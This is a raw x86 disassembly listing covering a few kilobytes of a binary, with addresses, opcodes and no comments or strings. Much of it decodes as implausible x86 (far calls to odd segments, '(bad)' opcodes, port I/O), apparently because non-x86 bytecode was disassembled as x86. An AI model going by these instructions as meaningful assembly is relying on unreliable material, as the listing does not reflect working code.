  4026f2:	sub    BYTE PTR [edx],dl
  4026f4:	add    BYTE PTR [eax],al
  4026f6:	push   es
  4026f7:	cmp    BYTE PTR [esi+0x3],bh
  4026fa:	add    BYTE PTR [eax],al
  4026fc:	push   es
  4026fd:	adc    DWORD PTR [eax],ecx
  4026ff:	call   0x2d06:0x2028
  402706:	jno    0x40270e
  402708:	adc    DWORD PTR [eax],ecx
  40270a:	call   0xa00:0x396f16
  402711:	pop    ds
  402712:	das    
  402713:	cs push cs
  402715:	push   es
  402716:	adc    DWORD PTR [eax],ecx
  402718:	call   0xa00:0x396f16
  40271f:	pop    ds
  402720:	sub    eax,0x4b722f33
  402725:	add    eax,DWORD PTR [eax]
  402727:	jo     0x402741
  402729:	lea    eax,[ecx]
  40272b:	add    BYTE PTR [eax],al
  40272d:	add    DWORD PTR [ebx],edx
  40272f:	sbb    dl,BYTE PTR [ecx]
  402731:	sbb    dl,BYTE PTR [esi]
  402733:	jb     0x40271a
  402735:	add    al,BYTE PTR [eax]
  402737:	jo     0x4026db
  402739:	adc    DWORD PTR [edx],ebx
  40273b:	pop    ss
  40273c:	push   es
  40273d:	adc    DWORD PTR [eax],ecx
  40273f:	call   0xd:0x281a11a2
  402746:	add    BYTE PTR [esi],al
  402748:	sub    BYTE PTR [edx],dl
  40274a:	add    BYTE PTR [eax],al
  40274c:	push   es
  40274d:	cmp    BYTE PTR [eax],ch
  40274f:	add    eax,DWORD PTR [eax]
  402751:	add    BYTE PTR [edx-0x5],dh
  402754:	add    al,BYTE PTR [eax]
  402756:	jo     0x40276f
  402758:	lea    eax,[ecx]
  40275a:	add    BYTE PTR [eax],al
  40275c:	add    DWORD PTR [ebx],edx
  40275e:	sbb    edx,DWORD PTR [ecx]
  402760:	sbb    edx,DWORD PTR [esi]
  402762:	push   es
  402763:	adc    DWORD PTR [eax],ecx
  402765:	call   0xd:0x281b11a2
  40276c:	add    BYTE PTR [esi],al
  40276e:	sub    BYTE PTR [edx],dl
  402770:	add    BYTE PTR [eax],al
  402772:	push   es
  402773:	cmp    BYTE PTR [edx],al
  402775:	add    eax,DWORD PTR [eax]
  402777:	add    BYTE PTR [esi],al
  402779:	adc    DWORD PTR [eax],ecx
  40277b:	call   0x1306:0x1f28
  402782:	or     eax,DWORD PTR [edi]
  402784:	adc    DWORD PTR [eax],ecx
  402786:	adc    DWORD PTR [ebx],ecx
  402788:	mov    ds:0xd581709,al
  40278d:	adc    DWORD PTR [eax],ecx
  40278f:	pop    ss
  402790:	pop    eax
  402791:	adc    ecx,DWORD PTR [eax]
  402793:	adc    DWORD PTR [eax],ecx
  402795:	push   es
  402796:	mov    gs,WORD PTR [ecx+0x3f]
  402799:	jle    0x402799
  40279b:	(bad)  
  40279c:	(bad)  
  40279d:	cmp    al,bl
  40279f:	add    al,BYTE PTR [eax]
  4027a1:	add    BYTE PTR [edx],al
  4027a3:	or     DWORD PTR [edx+0x37d72],ebx
  4027a9:	jo     0x40281a
  4027ab:	cmp    al,BYTE PTR [eax]
  4027ad:	add    BYTE PTR [edx],cl
  4027af:	cmp    edi,ebp
  4027b1:	add    BYTE PTR [eax],al
  4027b3:	add    BYTE PTR [edx],al
  4027b5:	or     DWORD PTR [edx+0xc110c13],ebx
  4027bb:	pop    ds
  4027bc:	sub    al,0x1b
  4027be:	outs   dx,DWORD PTR ds:[esi]
  4027bf:	cmp    eax,DWORD PTR [eax]
  4027c1:	add    BYTE PTR [edx],cl
  4027c3:	adc    ecx,DWORD PTR ds:0x33150d11
  4027c9:	or     DWORD PTR [ecx],edx
  4027cb:	or     al,0x6f
  4027cd:	and    eax,DWORD PTR [eax]
  4027cf:	add    BYTE PTR [edx],cl
  4027d1:	adc    ecx,DWORD PTR ds:0x111b0c11
  4027d7:	or     eax,0x246f591b
  4027dc:	add    BYTE PTR [eax],al
  4027de:	or     dl,BYTE PTR [ebx]
  4027e0:	push   cs
  4027e1:	adc    al,0x13
  4027e3:	unpcklps xmm2,XMMWORD PTR [ebx]
  4027e6:	adc    BYTE PTR [ebx+edx*1],dl
  4027e9:	adc    DWORD PTR [ecx],edx
  4027eb:	or     eax,0x12135817
  4027f0:	adc    DWORD PTR ds:0x236f0c11,ecx
  4027f6:	add    BYTE PTR [eax],al
  4027f8:	or     ch,BYTE PTR [edi]
  4027fa:	sbb    edx,DWORD PTR [ecx]
  4027fc:	or     al,0x1f
  4027fe:	sub    al,0x11
  402800:	adc    ch,BYTE PTR [edi+0x3b]
  402803:	add    BYTE PTR [eax],al
  402805:	or     dl,BYTE PTR [ebx]
  402807:	or     eax,0x33150d11
  40280c:	or     DWORD PTR [ecx],edx
  40280e:	or     al,0x6f
  402810:	and    eax,DWORD PTR [eax]
  402812:	add    BYTE PTR [edx],cl
  402814:	adc    ecx,DWORD PTR ds:0xd111211
  40281a:	das    
  40281b:	jb     0x40282e
  40281d:	or     al,0x11
  40281f:	adc    dl,BYTE PTR [ecx]
  402821:	or     eax,0x6f591211
  402826:	and    al,0x0
  402828:	add    BYTE PTR [edx],cl
  40282a:	adc    ecx,DWORD PTR [edi]
  40282c:	adc    DWORD PTR ds:0x236f0c11,ecx
  402832:	add    BYTE PTR [eax],al
  402834:	or     ch,BYTE PTR [edi]
  402836:	xor    DWORD PTR [ecx],edx
  402838:	or     eax,0x12135817
  40283d:	adc    DWORD PTR [edi+ebx*1],ecx
  402840:	sub    al,0x11
  402842:	adc    ch,BYTE PTR [edi+0x3b]
  402845:	add    BYTE PTR [eax],al
  402847:	or     dl,BYTE PTR [ebx]
  402849:	or     eax,0x33150d11
  40284e:	or     DWORD PTR [ecx],edx
  402850:	or     al,0x6f
  402852:	and    eax,DWORD PTR [eax]
  402854:	add    BYTE PTR [edx],cl
  402856:	adc    ecx,DWORD PTR ds:0x12110c11
  40285c:	adc    DWORD PTR ds:0x6f591211,ecx
  402862:	and    al,0x0
  402864:	add    BYTE PTR [edx],cl
  402866:	adc    edx,DWORD PTR [eax]
  402868:	adc    DWORD PTR ds:0x12135817,ecx
  40286e:	adc    DWORD PTR [edx],edx
  402870:	adc    DWORD PTR [edi+ebp*2],ecx
  402873:	and    eax,DWORD PTR [eax]
  402875:	add    BYTE PTR [edx],cl
  402877:	das    
  402878:	adc    eax,0x12110c11
  40287d:	adc    DWORD PTR [edi+ebp*2],ecx
  402880:	and    eax,DWORD PTR [eax]
  402882:	add    BYTE PTR [edx],cl
  402884:	adc    DWORD PTR [edx],edx
  402886:	pop    ecx
  402887:	outs   dx,DWORD PTR ds:[esi]
  402888:	and    al,0x0
  40288a:	add    BYTE PTR [edx],cl
  40288c:	adc    edx,DWORD PTR [ecx]
  40288e:	adc    DWORD PTR [esi],ecx
  402890:	adc    DWORD PTR [edi],ecx
  402892:	adc    DWORD PTR [eax],edx
  402894:	adc    DWORD PTR [ecx],edx
  402896:	adc    DWORD PTR [edi],eax
  402898:	jae    0x4028c7
  40289a:	add    BYTE PTR [eax],al
  40289c:	push   es
  40289d:	or     al,0x38
  40289f:	xlat   BYTE PTR ds:[ebx]
  4028a0:	add    DWORD PTR [eax],eax
  4028a2:	add    BYTE PTR [edx],al
  4028a4:	or     DWORD PTR [edx+0x38972],ebx
  4028aa:	jo     0x40291b
  4028ac:	cmp    al,BYTE PTR [eax]
  4028ae:	add    BYTE PTR [edx],cl
  4028b0:	sub    eax,0x9a09020f
  4028b5:	jb     0x402848
  4028b7:	add    eax,DWORD PTR [eax]
  4028b9:	jo     0x40292a
  4028bb:	cmp    al,BYTE PTR [eax]
  4028bd:	add    BYTE PTR [edx],cl
  4028bf:	sub    al,0x77
  4028c1:	add    cl,BYTE PTR [ecx]
  4028c3:	call   0x6f19:0x13111313
  4028ca:	cmp    BYTE PTR [eax],al
  4028cc:	add    BYTE PTR [edx],cl
  4028ce:	adc    edx,DWORD PTR [ebx]
  4028d0:	jle    0x40285f
  4028d2:	add    BYTE PTR [eax],al
  4028d4:	add    al,0x2d
  4028d6:	or     dh,BYTE PTR [ebx+0x3c]
  4028d9:	add    BYTE PTR [eax],al
  4028db:	or     al,BYTE PTR [eax+0x400008d]
  4028e1:	jle    0x402870
  4028e3:	add    BYTE PTR [eax],al
  4028e5:	add    al,0x11
  4028e7:	adc    ebp,DWORD PTR [eax]
  4028e9:	cmp    eax,0x6f0a0000
  4028ee:	add    BYTE PTR ds:[eax],al
  4028f1:	or     bl,ch
  4028f3:	add    DWORD PTR [ecx],0x0
  4028f6:	add    BYTE PTR [ebx],dl
  4028f8:	adc    al,0x72
  4028fa:	cdq    
  4028fb:	add    eax,DWORD PTR [eax]
  4028fd:	jo     0x402918
  4028ff:	lea    eax,[ecx]
  402901:	add    BYTE PTR [eax],al
  402903:	add    DWORD PTR [ebx],edx
  402905:	sbb    al,0x11
  402907:	sbb    al,0x16
  402909:	adc    DWORD PTR [ebx],edx
  40290b:	mov    ds:0x11171c11,al
  402910:	adc    al,0x6f
  402912:	aas    
  402913:	add    BYTE PTR [eax],al
  402915:	or     ch,BYTE PTR [edi+0x40]
  402918:	add    BYTE PTR [eax],al
  40291a:	or     ah,BYTE PTR [edx+0x11181c11]
  402920:	adc    al,0x6f
  402922:	inc    ecx
  402923:	add    BYTE PTR [eax],al
  402925:	or     ah,BYTE PTR [edx+0xd281c11]
  40292b:	add    BYTE PTR [eax],al
  40292d:	push   es
  40292e:	sub    BYTE PTR [edx],dl
  402930:	add    BYTE PTR [eax],al
  402932:	push   es
  402933:	fld    QWORD PTR [edx+0x1]
  402936:	add    BYTE PTR [eax],al
  402938:	add    cl,BYTE PTR [ecx]
  40293a:	call   0x6f0a:0x3228
  402941:	inc    edx
  402942:	add    BYTE PTR [eax],al
  402944:	or     dh,BYTE PTR [edx-0x45]
  402947:	add    eax,DWORD PTR [eax]
  402949:	jo     0x4029ba
  40294b:	add    BYTE PTR ss:[eax],al
  40294e:	or     ch,BYTE PTR ds:0x9a090219
  402954:	sub    BYTE PTR [edx],dh
  402956:	add    BYTE PTR [eax],al
  402958:	or     ch,BYTE PTR [edi+0x42]
  40295b:	add    BYTE PTR [eax],al
  40295d:	or     dh,BYTE PTR [edx-0x27]
  402960:	add    eax,DWORD PTR [eax]
  402962:	jo     0x4029d3
  402964:	add    BYTE PTR ss:[eax],al
  402967:	or     ch,BYTE PTR [eax+ecx*1]
  40296a:	pop    ss
  40296b:	adc    eax,DWORD PTR [esi]
  40296d:	cmp    BYTE PTR [eax],cl
  40296f:	add    DWORD PTR [eax],eax
  402971:	add    BYTE PTR [edx],al
  402973:	or     DWORD PTR [edx+0x3228],ebx
  402979:	or     ch,BYTE PTR [edi+0x42]
  40297c:	add    BYTE PTR [eax],al
  40297e:	or     dh,BYTE PTR [edx-0x9]
  402981:	add    eax,DWORD PTR [eax]
  402983:	jo     0x4029f4
  402985:	add    BYTE PTR ss:[eax],al
  402988:	or     ch,BYTE PTR ds:0x9a090219
  40298e:	sub    BYTE PTR [edx],dh
  402990:	add    BYTE PTR [eax],al
  402992:	or     ch,BYTE PTR [edi+0x42]
  402995:	add    BYTE PTR [eax],al
  402997:	or     dh,BYTE PTR [edx+0x11]
  40299a:	add    al,0x0
  40299c:	jo     0x402a0d
  40299e:	add    BYTE PTR ss:[eax],al
  4029a1:	or     ch,BYTE PTR [eax+ecx*1]
  4029a4:	push   ss
  4029a5:	adc    eax,DWORD PTR [edi]
  4029a7:	cmp    dh,cl
  4029a9:	add    BYTE PTR [eax],al
  4029ab:	add    BYTE PTR [edx],al
  4029ad:	or     DWORD PTR [edx+0x2028],ebx
  4029b3:	push   es
  4029b4:	sub    al,0x68
  4029b6:	adc    DWORD PTR [ebp*1+0x2d8d1727],eax
  4029bd:	add    BYTE PTR [eax],al
  4029bf:	add    DWORD PTR [edx],ecx
  4029c1:	push   es
  4029c2:	push   ss
  4029c3:	add    cl,BYTE PTR [ecx]
  4029c5:	call   0x0:0x2d8d17a2
  4029cc:	add    DWORD PTR [ebx],ecx
  4029ce:	pop    es
  4029cf:	push   ss
  4029d0:	push   es
  4029d1:	push   ss
  4029d2:	call   0xa206:0x1f28
  4029d9:	pop    ss
  4029da:	adc    eax,DWORD PTR [eax+edi*1]
  4029dd:	cdq    
  4029de:	add    BYTE PTR [eax],al
  4029e0:	add    BYTE PTR [ecx],dl
  4029e2:	add    eax,0x16070e2d
  4029e7:	add    cl,BYTE PTR [ecx]
  4029e9:	call   0x8738:0x51317a2
  4029f0:	add    BYTE PTR [eax],al
  4029f2:	add    BYTE PTR [edx+0x4b],dh
  4029f5:	add    eax,DWORD PTR [eax]
  4029f7:	jo     0x402a11
  4029f9:	lea    eax,[ecx]
  4029fb:	add    BYTE PTR [eax],al
  4029fd:	add    DWORD PTR [ebx],edx
  4029ff:	sbb    eax,0x72161d11
  402a04:	sub    eax,DWORD PTR [eax+eax*1]
  402a07:	jo     0x4029ab
  402a09:	adc    DWORD PTR ds:0x9a090217,ebx
  402a0f:	mov    ds:0xd281d11,al
  402a14:	add    BYTE PTR [eax],al
  402a16:	push   es
  402a17:	sub    BYTE PTR [edx],dl
  402a19:	add    BYTE PTR [eax],al
  402a1b:	push   es
  402a1c:	sub    esi,DWORD PTR [eax+0x2]
  402a1f:	or     DWORD PTR [edx+0x396f16],ebx
  402a25:	add    BYTE PTR [edx],cl
  402a27:	pop    ds
  402a28:	das    
  402a29:	cs or  eax,0x169a0902
  402a2f:	outs   dx,DWORD PTR ds:[esi]
  402a30:	cmp    DWORD PTR [eax],eax
  402a32:	add    BYTE PTR [edx],cl
  402a34:	pop    ds
  402a35:	sub    eax,0x39722133
  402a3a:	add    al,0x0
  402a3c:	jo     0x402a55
  402a3e:	lea    eax,[ecx]
  402a40:	add    BYTE PTR [eax],al
  402a42:	add    DWORD PTR [ebx],edx
  402a44:	push   ds
  402a45:	adc    DWORD PTR [esi],ebx
  402a47:	push   ss
  402a48:	add    cl,BYTE PTR [ecx]
  402a4a:	call   0xd:0x281e11a2
  402a51:	add    BYTE PTR [esi],al
  402a53:	sub    BYTE PTR [edx],dl
  402a55:	add    BYTE PTR [eax],al
  402a57:	push   es
  402a58:	sub    dh,BYTE PTR [edx-0x5]
  402a5b:	add    al,BYTE PTR [eax]
  402a5d:	jo     0x402a76
  402a5f:	lea    eax,[ecx]
  402a61:	add    BYTE PTR [eax],al
  402a63:	add    DWORD PTR [ebx],edx
  402a65:	pop    ds
  402a66:	adc    DWORD PTR [edi],ebx
  402a68:	push   ss
  402a69:	add    cl,BYTE PTR [ecx]
  402a6b:	call   0xd:0x281f11a2
  402a72:	add    BYTE PTR [esi],al
  402a74:	sub    BYTE PTR [edx],dl
  402a76:	add    BYTE PTR [eax],al
  402a78:	push   es
  402a79:	sub    cl,BYTE PTR [ecx]
  402a7b:	pop    ss
  402a7c:	pop    eax
  402a7d:	or     eax,0x698e0209
  402a82:	das    
  402a83:	or     bh,BYTE PTR [esi-0x77]
  402a86:	add    BYTE PTR [eax],al
  402a88:	add    al,0x39
  402a8a:	pop    ecx
  402a8b:	sti    
  402a8c:	(bad)  
  402a8d:	inc    DWORD PTR [esi]
  402a8f:	sub    al,0x5
  402a91:	push   es
  402a92:	mov    gs,WORD PTR [ecx+0x2d]
  402a95:	or     eax,0x897e
  402a9a:	add    al,0x2d
  402a9c:	push   es
  402a9d:	sub    BYTE PTR [edx],ch
  402a9f:	add    BYTE PTR [eax],al
  402aa1:	push   es
  402aa2:	sub    cl,BYTE PTR [eax]
  402aa4:	sub    al,0x2d
  402aa6:	or     BYTE PTR [ecx],dl
  402aa8:	pop    es
  402aa9:	outs   dx,DWORD PTR ds:[esi]
  402aaa:	xor    eax,DWORD PTR [eax]
  402aac:	add    BYTE PTR [esi],al
  402aae:	push   es
  402aaf:	mov    gs,WORD PTR [ecx+0x17]
  402ab2:	xor    DWORD PTR [edi],ebx
  402ab4:	or     BYTE PTR [edi+0x30],ch
  402ab7:	add    BYTE PTR [eax],al
  402ab9:	push   es
  402aba:	sub    eax,0x316f0808
  402abf:	add    BYTE PTR [eax],al
  402ac1:	push   es
  402ac2:	sub    al,0xf
  402ac4:	jb     0x402b29
  402ac6:	add    al,0x0
  402ac8:	jo     0x402af2
  402aca:	push   cs
  402acb:	add    BYTE PTR [eax],al
  402acd:	push   es
  402ace:	sub    BYTE PTR [edx],dl
  402ad0:	add    BYTE PTR [eax],al
  402ad2:	push   es
  402ad3:	jle    0x402a5e
  402ad5:	add    BYTE PTR [eax],al
  402ad7:	add    al,0x2d
  402ad9:	and    dl,BYTE PTR [esi]
  402adb:	adc    edx,DWORD PTR ds:0x1106162b
  402ae1:	adc    eax,0x1511079a
  402ae6:	call   0x21:0x28061108
  402aed:	add    BYTE PTR [esi],al
  402aef:	adc    DWORD PTR ds:0x15135817,edx
  402af5:	adc    DWORD PTR ds:0x32698e06,edx
  402afb:	jecxz  0x402b7b
  402afd:	mov    al,BYTE PTR [eax]
  402aff:	add    BYTE PTR [esp+ebp*1],al
  402b02:	sub    al,0x28
  402b04:	sub    al,0x0
  402b06:	add    BYTE PTR [edx],cl
  402b08:	jb     0x402a97
  402b0a:	add    al,0x0
  402b0c:	jo     0x402b25
  402b0e:	lea    eax,[ecx]
  402b10:	add    BYTE PTR [eax],al
  402b12:	add    DWORD PTR [ebx],edx
  402b14:	and    BYTE PTR [ecx],dl
  402b16:	and    BYTE PTR [esi],dl
  402b18:	jle    0x402aa4
  402b1a:	add    BYTE PTR [eax],al
  402b1c:	add    al,0x8c
  402b1e:	xor    DWORD PTR [eax],eax
  402b20:	add    BYTE PTR [ecx],al
  402b22:	mov    ds:0xd282011,al
  402b27:	add    BYTE PTR [eax],al
  402b29:	push   es
  402b2a:	outs   dx,DWORD PTR ds:[esi]
  402b2b:	inc    ebx
  402b2c:	add    BYTE PTR [eax],al
  402b2e:	or     bh,BYTE PTR [esi-0x77]
  402b31:	add    BYTE PTR [eax],al
  402b33:	add    al,0x2c
  402b35:	bound  ebp,QWORD PTR [eax]
  402b37:	sub    al,0x0
  402b39:	add    BYTE PTR [edx],cl
  402b3b:	jb     0x402ae4
  402b3d:	add    al,0x0
  402b3f:	jo     0x402b58
  402b41:	lea    eax,[ecx]
  402b43:	add    BYTE PTR [eax],al
  402b45:	add    DWORD PTR [ebx],edx
  402b47:	and    DWORD PTR [ecx],edx
  402b49:	and    DWORD PTR [esi],edx
  402b4b:	jle    0x402ad6
  402b4d:	add    BYTE PTR [eax],al
  402b4f:	add    al,0x8c
  402b51:	xor    DWORD PTR [eax],eax
  402b53:	add    BYTE PTR [ecx],al
  402b55:	mov    ds:0xd282111,al
  402b5a:	add    BYTE PTR [eax],al
  402b5c:	push   es
  402b5d:	outs   dx,DWORD PTR ds:[esi]
  402b5e:	inc    ebx
  402b5f:	add    BYTE PTR [eax],al
  402b61:	or     al,BYTE PTR [edi]
  402b63:	sub    al,0x39
  402b65:	pop    es
  402b66:	adc    esp,DWORD PTR [edx]
  402b68:	push   ss
  402b69:	adc    esp,DWORD PTR [ebx]
  402b6b:	sub    esp,DWORD PTR [edx]
  402b6d:	adc    DWORD PTR [edx],esp
  402b6f:	adc    DWORD PTR [ebx],esp
  402b71:	call   0x4428:0x16111613
  402b78:	add    BYTE PTR [eax],al
  402b7a:	or     ch,BYTE PTR [esp+ecx*1]
  402b7d:	adc    DWORD PTR [esi],edx
  402b7f:	sub    BYTE PTR [ebp+0x0],al
  402b82:	add    BYTE PTR [edx],cl
  402b84:	fiadd  WORD PTR [ebx]
  402b86:	fiadd  WORD PTR es:[eax]
  402b89:	adc    DWORD PTR [ebx],esp
  402b8b:	pop    ss
  402b8c:	pop    eax
  402b8d:	adc    esp,DWORD PTR [ebx]
  402b8f:	adc    DWORD PTR [ebx],esp
  402b91:	adc    DWORD PTR [edx],esp
  402b93:	mov    gs,WORD PTR [ecx+0x32]
  402b96:	(bad)  
  402b97:	sub    dl,BYTE PTR [esi]
  402b99:	sub    BYTE PTR ds:0x2a0a0000,dh
  402b9f:	add    BYTE PTR [ecx],al
  402ba1:	sbb    al,0x0
  402ba3:	add    BYTE PTR [eax],al
  402ba5:	add    BYTE PTR [ecx+0x3],ah
  402ba8:	push   ss
  402ba9:	ja     0x402bae
  402bab:	inc    ecx
  402bac:	add    eax,0x10000
  402bb1:	add    ch,bh
  402bb3:	add    eax,0x3060609
  402bb8:	add    DWORD PTR [eax],eax
  402bba:	add    BYTE PTR [ecx],al
  402bbc:	adc    esi,DWORD PTR [eax]
  402bbe:	add    eax,DWORD PTR [eax]
  402bc0:	daa    
  402bc1:	add    BYTE PTR [eax],al
  402bc3:	add    BYTE PTR [edi],al
  402bc5:	add    BYTE PTR [eax],al
  402bc7:	adc    DWORD PTR [edx],eax
  402bc9:	sub    eax,0x22a1402
  402bce:	pop    ds
  402bcf:	outs   dx,DWORD PTR cs:[esi]
  402bd1:	inc    esi
  402bd2:	add    BYTE PTR [eax],al
  402bd4:	or     cl,BYTE PTR [edx]
  402bd6:	push   es
  402bd7:	adc    eax,0x2a140233
  402bdc:	add    dl,BYTE PTR [esi]
  402bde:	push   es
  402bdf:	outs   dx,DWORD PTR ds:[esi]
  402be0:	and    al,0x0
  402be2:	add    BYTE PTR [edx],cl
  402be4:	jb     0x402b73
  402be6:	add    al,BYTE PTR [eax]
  402be8:	jo     0x402c12
  402bea:	and    eax,0x2a0a0000
  402bef:	add    BYTE PTR [ebx],dl
  402bf1:	xor    BYTE PTR [eax+eax*1],al
  402bf4:	push   eax
  402bf5:	add    BYTE PTR [eax],al
  402bf7:	add    BYTE PTR [eax],cl
  402bf9:	add    BYTE PTR [eax],al
  402bfb:	adc    DWORD PTR [edx],eax
  402bfd:	sub    eax,0x282a1602
  402c02:	xor    al,BYTE PTR [eax]
  402c04:	add    BYTE PTR [edx],cl
  402c06:	outs   dx,DWORD PTR ds:[esi]
  402c07:	inc    edi
  402c08:	add    BYTE PTR [eax],al
  402c0a:	or     cl,BYTE PTR [edx]
  402c0c:	push   es
  402c0d:	add    dh,BYTE PTR [edx-0x7f]
  402c10:	add    al,BYTE PTR [eax]
  402c12:	jo     0x402c2b
  402c14:	outs   dx,DWORD PTR ds:[esi]
  402c15:	dec    eax
  402c16:	add    BYTE PTR [eax],al
  402c18:	or     ch,BYTE PTR ds:0x7202062d
  402c1e:	add    al,BYTE PTR gs:[eax]
  402c21:	jo     0x402c3a
  402c23:	outs   dx,DWORD PTR ds:[esi]
  402c24:	dec    eax
  402c25:	add    BYTE PTR [eax],al
  402c27:	or     ch,BYTE PTR ds:0x7202061e
  402c2d:	outs   dx,DWORD PTR ds:[esi]
  402c2e:	add    al,BYTE PTR [eax]
  402c30:	jo     0x402c49
  402c32:	outs   dx,DWORD PTR ds:[esi]
  402c33:	dec    eax
  402c34:	add    BYTE PTR [eax],al
  402c36:	or     ch,BYTE PTR ds:0x7202060f
  402c3c:	lea    eax,[edx]
  402c3e:	add    BYTE PTR [eax+0x17],dh
  402c41:	outs   dx,DWORD PTR ds:[esi]
  402c42:	dec    eax
  402c43:	add    BYTE PTR [eax],al
  402c45:	or     ch,BYTE PTR [edx+eax*1]
  402c48:	pop    ss
  402c49:	sub    dl,BYTE PTR [esi]
  402c4b:	sub    bl,BYTE PTR [ebx]
  402c4d:	xor    BYTE PTR [eax+eax*1],al
  402c50:	jmp    0x402c54
  402c52:	add    BYTE PTR [eax],al
  402c54:	or     DWORD PTR [eax],eax
  402c56:	add    BYTE PTR [ecx],dl
  402c58:	jle    0x402be5
  402c5a:	add    BYTE PTR [eax],al
  402c5c:	add    al,0x6f
  402c5e:	dec    ecx
  402c5f:	add    BYTE PTR [eax],al
  402c61:	or     bh,BYTE PTR [esi-0x74]
  402c64:	add    BYTE PTR [eax],al
  402c66:	add    al,0x6f
  402c68:	dec    edx
  402c69:	add    BYTE PTR [eax],al
  402c6b:	or     al,BYTE PTR [edx]
  402c6d:	sub    BYTE PTR [eax+eax*1+0x0],al
  402c71:	or     ch,BYTE PTR ds:0x4bd7223
  402c77:	add    BYTE PTR [eax+0x17],dh
  402c7a:	lea    eax,[ecx]
  402c7c:	add    BYTE PTR [eax],al
  402c7e:	add    DWORD PTR [ebx],edx
  402c80:	or     DWORD PTR [ecx],edx
  402c82:	or     DWORD PTR [esi],edx
  402c84:	add    ah,BYTE PTR [edx+0xd280911]
  402c8a:	add    BYTE PTR [eax],al
  402c8c:	push   es
  402c8d:	sub    BYTE PTR [edx],dl
  402c8f:	add    BYTE PTR [eax],al
  402c91:	push   es
  402c92:	(bad)  [ebx+0x7e000002]
  402c98:	lea    eax,[eax]
  402c9a:	add    BYTE PTR [esp+ebp*1],al
  402c9d:	and    edi,DWORD PTR [esi-0x73]
  402ca0:	add    BYTE PTR [eax],al
  402ca2:	add    al,0x6f
  402ca4:	dec    ebx
  402ca5:	add    BYTE PTR [eax],al
  402ca7:	or     dl,BYTE PTR [esi]
  402ca9:	xor    DWORD PTR [esi],edx
  402cab:	sub    BYTE PTR [eax+eax*1+0x0],cl
  402caf:	or     dl,BYTE PTR [esi+edi*8]
  402cb2:	push   es
  402cb3:	and    al,BYTE PTR [eax]
  402cb5:	add    BYTE PTR [esi],al
  402cb7:	jae    0x402d06
  402cb9:	add    BYTE PTR [eax],al
  402cbb:	or     ch,BYTE PTR [edi+0x4e]
  402cbe:	add    BYTE PTR [eax],al
  402cc0:	or     al,BYTE PTR [edx]
  402cc2:	add    eax,0x2428
  402cc7:	push   es
  402cc8:	fst    QWORD PTR [eax+0x1]
  402ccb:	add    BYTE PTR [eax],al
  402ccd:	or     al,BYTE PTR [esi]
  402ccf:	outs   dx,DWORD PTR ds:[esi]
  402cd0:	dec    edi
  402cd1:	add    BYTE PTR [eax],al
  402cd3:	or     dh,BYTE PTR [ebp+0x3a]
  402cd6:	add    BYTE PTR [eax],al
  402cd8:	add    DWORD PTR [esi+eiz*1],ebp
  402cdb:	push   es
  402cdc:	outs   dx,DWORD PTR ds:[esi]
  402cdd:	dec    edi
  402cde:	add    BYTE PTR [eax],al
  402ce0:	or     dh,BYTE PTR [edx+edi*1+0x0]
  402ce4:	add    BYTE PTR [ecx],al
  402ce6:	or     eax,DWORD PTR [edi]
  402ce8:	outs   dx,DWORD PTR ds:[esi]
  402ce9:	inc    ecx
  402cea:	add    BYTE PTR [eax],al
  402cec:	or     al,BYTE PTR [edx]
  402cee:	pop    es
  402cef:	outs   dx,DWORD PTR ds:[esi]
  402cf0:	push   eax
  402cf1:	add    BYTE PTR [eax],al
  402cf3:	or     al,BYTE PTR [edi]
  402cf5:	outs   dx,DWORD PTR ds:[esi]
  402cf6:	push   ecx
  402cf7:	add    BYTE PTR [eax],al
  402cf9:	or     ch,BYTE PTR [eax]
  402cfb:	push   ss
  402cfc:	add    BYTE PTR [eax],al
  402cfe:	push   es
  402cff:	sub    ecx,DWORD PTR [esi+eax*1]
  402d02:	outs   dx,DWORD PTR ds:[esi]
  402d03:	inc    ecx
  402d04:	add    BYTE PTR [eax],al
  402d06:	or     al,BYTE PTR [edx]
  402d08:	sub    BYTE PTR [eax+eax*1],dl
  402d0b:	add    BYTE PTR [esi],al
  402d0d:	fnsave [eax]
  402d0f:	add    al,BYTE PTR [eax]
  402d11:	add    BYTE PTR [eax+ecx*1],cl
  402d14:	outs   dx,DWORD PTR ds:[esi]
  402d15:	inc    ecx
  402d16:	add    BYTE PTR [eax],al
  402d18:	or     cl,BYTE PTR [eax]
  402d1a:	outs   dx,DWORD PTR ds:[esi]
  402d1b:	cmp    eax,0x8060000
  402d20:	outs   dx,DWORD PTR ds:[esi]
  402d21:	add    BYTE PTR ds:[eax],al
  402d24:	push   es
  402d25:	or     BYTE PTR [edi+0x3f],ch
  402d28:	add    BYTE PTR [eax],al
  402d2a:	push   es
  402d2b:	sub    BYTE PTR [esi],dl
  402d2d:	add    BYTE PTR [eax],al
  402d2f:	push   es
  402d30:	fisttp QWORD PTR ds:0xd000002
  402d36:	or     DWORD PTR [edi+0x41],ebp
  402d39:	add    BYTE PTR [eax],al
  402d3b:	or     al,BYTE PTR [edx]
  402d3d:	or     DWORD PTR [edi+0x50],ebp
  402d40:	add    BYTE PTR [eax],al
  402d42:	or     cl,BYTE PTR [ecx]
  402d44:	outs   dx,DWORD PTR ds:[esi]
  402d45:	push   ecx
  402d46:	add    BYTE PTR [eax],al
  402d48:	or     ch,BYTE PTR [eax]
  402d4a:	push   ss
  402d4b:	add    BYTE PTR [eax],al
  402d4d:	push   es
  402d4e:	fucomp st(7)
  402d50:	add    DWORD PTR [eax],eax
  402d52:	add    BYTE PTR [ebx],dl
  402d54:	add    al,0x11
  402d56:	add    al,0x6f
  402d58:	inc    ecx
  402d59:	add    BYTE PTR [eax],al
  402d5b:	or     al,BYTE PTR [edx]
  402d5d:	sub    BYTE PTR [eax+eax*1],dl
  402d60:	add    BYTE PTR [esi],al
  402d62:	adc    DWORD PTR [edi+ebp*2],eax
  402d65:	dec    edi
  402d66:	add    BYTE PTR [eax],al
  402d68:	or     bh,BYTE PTR [ecx]
  402d6a:	stos   BYTE PTR es:[edi],al
  402d6b:	add    BYTE PTR [eax],al
  402d6d:	add    BYTE PTR [ecx],dl
  402d6f:	add    al,0x6f
  402d71:	dec    edi
  402d72:	add    BYTE PTR [eax],al
  402d74:	or     dl,BYTE PTR [ebx]
  402d76:	add    eax,0xc820
  402d7b:	add    BYTE PTR [ebx+0x52],dh
  402d7e:	add    BYTE PTR [eax],al
  402d80:	or     dl,BYTE PTR [ebx]
  402d82:	push   es
  402d83:	adc    DWORD PTR [esi],eax
  402d85:	adc    DWORD PTR [edi+ebp*2],eax
  402d88:	inc    ecx
  402d89:	add    BYTE PTR [eax],al
  402d8b:	or     ch,BYTE PTR [edi+0x53]
  402d8e:	add    BYTE PTR [eax],al
  402d90:	or     ah,BYTE PTR [esi]
